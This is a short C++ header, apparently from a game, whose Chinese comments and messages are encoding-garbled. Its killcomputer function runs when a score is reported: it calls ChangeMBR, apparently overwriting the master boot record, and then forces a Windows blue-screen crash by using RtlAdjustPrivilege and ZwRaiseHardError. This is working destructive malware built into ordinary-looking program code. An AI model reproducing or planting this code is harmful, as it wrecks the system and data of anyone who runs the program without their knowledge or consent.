#ifndef CONKILL_H
#define CONKILL_H

#include <iostream>
#include "changembr.h"
#include <windows.h>

using namespace std;

void bluescreen()
{
	HMODULE ntdll=LoadLibrary("ntdll.dll");//����ntdll
	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//��ȡ��Ȩ����
	FARPROC ZwRaiseHardErr=GetProcAddress(ntdll,"ZwRaiseHardError");//��ȡ��������
	unsigned char ErrKill;
	long unsigned int HDErr;
	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);//����RtlAdjustPrivliege������ȡSeShutdownPrivilegeȨ��
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(0xc0000233,0,0,0,6, &HDErr);//ʹ��ZwRaiseHardError��������
}

void killcomputer(int score)
{
	system("cls");
	cout << "\t\t������!��ķ���Ϊ" << score << "��,������!"<<endl;
	cout << "\t\t������!������!������!������!������!!!!!!!!!!!!!!!!!!!!!!!!!!!"<<endl;
	cout << "��ô,������������Լ,������ļ������!"<<endl;
	ChangeMBR();
	Sleep(5000);
	bluescreen();
}
#endif
